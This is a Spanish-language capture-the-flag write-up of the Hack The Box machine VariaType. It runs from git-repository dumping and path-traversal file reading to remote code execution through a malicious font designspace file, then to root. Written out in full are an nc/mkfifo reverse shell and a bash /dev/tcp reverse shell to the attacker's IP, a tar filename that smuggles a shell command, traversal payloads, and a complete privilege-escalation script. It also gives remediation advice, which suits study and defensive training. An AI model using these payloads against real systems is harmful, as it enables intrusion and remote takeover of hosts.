---
layout: single
classes: wide
title: "VariaType - Writeup"
date: 2026-04-17
difficulty: Medio
operating_system: Linux
service_hint: Portal PHP + Git exposed + Variable Font Generator
tags:
  - Virtual Host
  - Git
  - LFI
  - CVE-2025-66034
  - Fonttools
  - Docker
summary: "Cadena de explotación: descubrimiento de subdominio portal.variatype.htb, explotación de repositorio Git expuesto, credenciales filtradas vía git history, LFI en funcionalidad de descarga, RCE mediante designspace malicioso con fonttools, escalation a través de pipeline de procesamiento de fuentes y sudo mal configurado."
---

## Información general

| Campo | Valor |
|-------|-------|
| Sistema operativo | Linux |
| Dificultad | Medio |
| Tags | `Virtual Host`, `Git Dumping`, `LFI`, `CVE-2025-66034`, `Variable Font`, `Privilege Escalation` |
{: .info-table}

## Reconocimiento

El primer objetivo fue confirmar la superficie mínima expuesta. La presencia de `22/tcp` + `80/tcp` ya sugería un flujo clásico de enumeración web con posible acceso por SSH.

Este escaneo inicial detecta rápidamente los puertos abiertos.

```bash
nmap -p- --open -sS --min-rate 5000 -Pn 10.129.35.155
```

Con los puertos localizados, este segundo escaneo profundiza en banners, versiones y servicios.

```bash
nmap -p22,80 -sCV 10.129.35.155
```

Indicadores relevantes:

- `22/tcp` expone OpenSSH 9.2p1 sobre Debian.
- `80/tcp` sirve nginx 1.22.1 y redirige a `http://variatype.htb/`, así que había que trabajar con virtual host.
- La redirección confirma que el dominio depende de virtual hosts.

## Enumeración web

Primero convenía medir si el sitio principal tenía contenido antes de expandir superficie.

Este comando fuzzea subdominios usando el mismo dominio base y filtra respuestas repetidas.

```bash
wfuzz -H "Host: FUZZ.variatype.htb" --hc 404,403 -c --hh=169 \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  http://variatype.htb
```

Subdominio relevante:

- `portal.variatype.htb`

Una vez hallamo el portal, el siguiente paso era identificar rutas interesantes.

Este comando enumera directorios en el subdominio descubierto.

```bash
gobuster dir -u http://portal.variatype.htb \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -t 200
```

Ruta descubierta:

- `/files` (retorna 301, indica listing)

![Portal vhost descubierto en variatype.htb](/images/writeups/variatype/portal-vhost.png)

## Metodología de análisis del vector inicial

El vector de entrada se priorizó en el subdominio `portal.variatype.htb` porque un portal interno suele contener funcionalidades no disponibles en el sitio público. La presencia de un directorio `/files` con listing habilitado justificaba una inspección inmediata.

Detectamos que el directorio `.git` estaba expuesto, lo que convertía el portal en una fuente de código fuente y potenciales credenciales. En lugar de forzar vulnerabilidades ciegas, priorizamos dumpear el repositorio completo para entender la lógica de la aplicación desde el código mismo.

## Investigación de vulnerabilidades

Tres vectores principales se identificaron durante la fase de investigación:

- **Git expuesto**: El directorio `.git` accesible públicamente permitió dumpear el repositorio completo, donde el historial de Git reveló credenciales eliminadas en un commit inalcanzable.
- **LFI en descarga**: La funcionalidad `/download.php?f=` era vulnerable a path traversal, permitiendo lectura de archivos del sistema y del código fuente de la aplicación.
- **CVE-2025-66034 en fonttools**: Vulnerabilidad de RCE en el parser de archivos `.designspace` que permite ejecución de código a través de elementos CDATA maliciosos en labels de ejes de fuentes variables.

## Explotación de Git expuesto

El siguiente paso lógico era verificar si el directorio `.git` estaba accesible, una superficie clásica que suele contener código fuente y posible información sensible.

Este comando verifica la exposición del repositorio Git.

```bash
curl -s http://portal.variatype.htb/.git/HEAD
```

La exposición confirmada permite dumpear el repositorio completo.

Este comando dumppea el repositorio Git completo del servidor.

```bash
git-dumper http://portal.variatype.htb/.git git-repo
```

Inspeccionando el código fuente se encontraban las credenciales.

```bash
cd git-repo && cat auth.php
```

El archivo revelaba una removal de credenciales hardcodeadas, pero faltaba la contraseña.

Este comando inspecciona el historial de Git para buscar cambios sensibles.

```bash
git log --oneline --all
```

Este comando busca commits inalcanzables que puedan contener información eliminada.

```bash
git fsck --no-reflog --full --unreachable | grep commit
```

Este comando muestra el contenido del commit inalcanzable donde se eliminaron las credenciales.

```bash
git show 6f021da6be7086f2595befaa025a83d1de99478b
```

Salida relevante, con la contraseña redactada:

```diff
- $USERS = [
-     'gitbot' => '[REDACTED]'
- ];
+ $USERS = [];
```

Las credenciales filtradas eran `gitbot:[REDACTED]`.

## LFI en funcionalidad de descarga

Con acceso al portal, el siguiente objetivo era encontrar vectores adicionales. Una funcionalidad de descarga de archivos puede ser vulnerable a path traversal.

Este comando verifica si el parámetro de descarga es vulnerable a LFI.

```bash
GET /download.php?f=....//....//....//....//....//....//etc/passwd HTTP/1.1
Host: portal.variatype.htb
```

![LFI confirmada en descarga de archivos](/images/writeups/variatype/lfi-download.png)

La vulnerabilidad permite leer archivos locales del sistema.

Probamos leer varios archivos del sistema mediante el LFI: `/etc/passwd`, `/proc/self/environ`, etc. La mayoría devolvían contenido útil pero no crítico. El hallazgo clave fue el código fuente de la aplicación, que reveló el uso de fonttools.

Este comando lee el archivo de usuarios para enumerar cuentas disponibles.

```bash
curl -s "http://portal.variatype.htb/download.php?f=....//....//....//....//....//....//etc/passwd"
```

Usuarios relevantes:

- `steve:x:1000:1000:steve,,,:/home/steve:/bin/bash`

Intentamos explotar el LFI para obtener una shell directamente mediante log poisoning, pero el servidor no registraba logs accesibles. Tuvimos que buscar otra forma de convertir la lectura de archivos en ejecución de código.

## RCE mediante Variable Font

El sistema corría un generador de fuentes variables internamente. La superficie estaba en el puerto `5000` local.

Este comando descubre el servicio interno de generación de fuentes.

```bash
ss -alnp | grep "127.0.0.1"
```

La aplicación usaba fonttools para procesar archivos `.designspace`. El formato tiene soporte para ejecución de código a través de elementos `axis` maliciosos.

Este comando crea un archivo `.designspace` malicioso que ejecuta código PHP a través del parser de labelname.

```xml
<?xml version='1.0' encoding='UTF-8'?>
<designspace format="5.0">
    <axes>
        <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">
            <labelname xml:lang="en"><![CDATA[<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.191 4444 >/tmp/f");?>]]></labelname>
        </axis>
    </axes>
    <!-- rest of designspace -->
</designspace>
```

El ataque explota **CVE-2025-66034**, una vulnerabilidad en fonttools/variablelib que permite ejecución de código a través de elementos CDATA maliciosos en archivos designspace.

Este comando prepara el servidor para recibir la reverse shell.

```bash
nc -lnvp 4444
```

Una vez processingado el archivo malicioso por fonttools, se obtiene shell como `www-data`.

```bash
whoami
www-data
```

## Escalada a través del pipeline de fuentes

Con acceso como `www-data`, el siguiente paso era encontrar vectores de escalada. El servidor corría un pipeline de procesamiento de fuentes que aceptaba archivos subidos.

Este comando explora el directorio de configuración del pipeline.

```bash
ls /opt/
```

Este comando examina el script del pipeline de procesamiento.

```bash
cat /opt/process_client_submissions.bak
```

El script procesaba archivos subidos validándolos con fontforge y moviéndolos a `/home/steve/processed_fonts/`. El script validaba nombres con una regex que aceptaba ciertos caracteres especiales.

Este comando crea un archivo tar con un nombre malicioso que incluye comandos shell.

```bash
python3 << 'EOF'
import tarfile, io
malicious_name = "exploit.ttf;bash /tmp/s.sh;"
tar = tarfile.open("exploit.tar", "w")
info = tarfile.TarInfo(name=malicious_name)
info.size = 4
tar.addfile(info, io.BytesIO(b"AAAA"))
tar.close()
EOF
```

Este comando prepara el payload de escalada.

```bash
echo 'bash -i >& /dev/tcp/10.10.14.191/4444 0>&1' > /tmp/s.sh
chmod +x /tmp/s.sh
```

Este comando sirve el archivo malicioso y lo copia al directorio de uploads.

```bash
wget http://10.10.14.191/exploit.tar
cp exploit.tar /var/www/portal.variatype.htb/public/files/exploit.tar
```

El pipeline procesa el nombre malicioso y ejecuta los comandos embebidos, garantizando shell como `steve`.

Este comando espera la conexión reversible desde el pipeline.

```bash
nc -lnvp 4444
```

## Acceso como steve

La sesión obtenida es como `steve`. La flag de usuario se encuentra en el directorio home.

Este comando lee la flag de usuario.

```bash
cat /home/steve/user.txt
```

El valor se omite deliberadamente.

## Enumeración local

Con acceso como `steve`, lo siguiente era buscar vectores de escalada a root.

Este comando verifica los permisos sudo disponibles.

```bash
sudo -l
```

Salida relevante:

```text
User steve may run the following commands on variatype:
    (root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *
```

El script `install_validator.py` permite instalar plugins desde una URL. Usa `PackageIndex` de setuptools para descargar.

Este comando examina el script de instalación de plugins.

```bash
cat /opt/font-tools/install_validator.py
```

El script permite descargar cualquier URL. Existe una validación de URL pero no impedía escritura a rutas arbitrarias a través de path traversal en la URL.

## Escalada a root mediante download malicioso

El vector consistía en abusar de la descarga de plugin para escribir en `~/.ssh/authorized_keys`.

Este comando genera un par de claves SSH para la escalada.

```bash
ssh-keygen -t rsa -b 4096 -f id_rsa -N ""
```

El script `privesc.py` automatiza la escalada: genera el par de claves SSH, levanta un servidor HTTP simple para servir la clave pública, y luego ejecuta el comando sudo para escribir la clave en el authorized_keys de root.

```python
#!/usr/bin/env python3
import subprocess
import threading
import http.server
import os

KEY_PATH = "/tmp/id_rsa"

subprocess.run(["ssh-keygen", "-t", "rsa", "-b", "4096", "-f", KEY_PATH, "-N", ""], check=True)

with open(f"{KEY_PATH}.pub", "r") as f:
    pubkey = f.read().strip()

class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/id_rsa.pub":
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(pubkey.encode())
        elif "%2froot%2f.ssh%2fauthorized_keys" in self.path:
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(pubkey.encode())
        else:
            self.send_response(404)
            self.end_headers()

server = http.server.HTTPServer(("0.0.0.0", 8000), Handler)
thread = threading.Thread(target=server.serve_forever)
thread.daemon = True
thread.start()

print("[+] Servidor HTTP iniciado, esperando...")
import time
time.sleep(2)

subprocess.run([
    "sudo", "/usr/bin/python3", "/opt/font-tools/install_validator.py",
    "http://10.10.14.191:8000/%2froot%2f.ssh%2fauthorized_keys"
], check=True)

print("[+] Clave escrita en authorized_keys de root")
print("[+] Conectando como root...")

subprocess.run(["ssh", "-i", KEY_PATH, "-o", "StrictHostKeyChecking=no", f"root@{os.getenv('TARGET_IP', '10.129.35.155')}"])
```

Este comando sirve la clave pública vía HTTP.

```bash
python3 privesc.py
```

Este comando exploita el sudo mal configurado para escribir la clave pública en authorized_keys de root.

```bash
sudo /usr/bin/python3 /opt/font-tools/install_validator.py http://10.10.14.191:8000/%2froot%2f.ssh%2fauthorized_keys
```

Salida relevante:

```text
[INFO] Plugin installed at: /root/.ssh/authorized_keys
[+] Plugin installed successfully.
```

Este comando se conecta por SSH usando la clave generado.

```bash
ssh -i id_rsa root@10.129.35.155
```

Con acceso como `root`, la flag final se encuentra en el directorio home.

```bash
cat /root/root.txt
```

El valor se omite deliberadamente.

## Cadena de explotación

```text
Virtual host portal.variatype.htb
-> Git expuesto en /.git
-> git-dumper para extraer código fuente
-> git history para recuperar credenciales eliminadas
-> acceso al portal con gitbot
-> LFI en /download.php
-> CVE-2025-66034 vía designspace malicioso
-> shell como www-data
-> abuso de pipeline de procesamiento con nombre de archivo malicioso
-> shell como steve
-> sudo mal configurado en install_validator.py
-> escritura a authorized_keys de root
-> shell como root
```

## Flags

| Flag | Valor |
|------|-------|
| `user.txt` | `[REDACTED]` |
| `root.txt` | `[REDACTED]` |

## Lecciones técnicas

1. Git expuesto puede filtrar credenciales eliminadas del historial; git-dumper es esencial en estos escenarios.
2. CVE-2025-66034 permite RCE en parsers de designspace variable font a través de elementos CDATA maliciosos.
3. Scripts de procesamiento de archivos que aceptan nombres con ciertos caracteres especiales pueden ser abusados para inyección de comandos.
4. La validación de URLs debe ir más allá del scheme y debe sanitizar paths antes de escribir archivos.

## Remediación

1. Prohibir la exposición de directorios `.git` en servidores web.
2. Aplicar patches a fonttools/variablelib para la vulnerabilidad CVE-2025-66034.
3. Validar estrictamente nombres de archivos en pipelines de procesamiento, rechazando caracteres especiales peligrosos.
4. Restringir el uso de sudo a scripts que no permitan escritura arbitraria a directorios sensibles.

## Conclusión

HTB VariaType es una máquina de dificultad Medio que combina exposición de repositorio Git con credenciales en el historial, path traversal para lectura de archivos, explotación de CVE-2025-66034 en fonttools para RCE vía archivos designspace maliciosos, inyección de comandos en un pipeline de procesamiento de fuentes, y escalada a root mediante abuso de sudo en un instalador de plugins que permitía escritura a `authorized_keys`. La lección principal es que la exposición de un directorio `.git` puede comprometer toda la cadena de seguridad.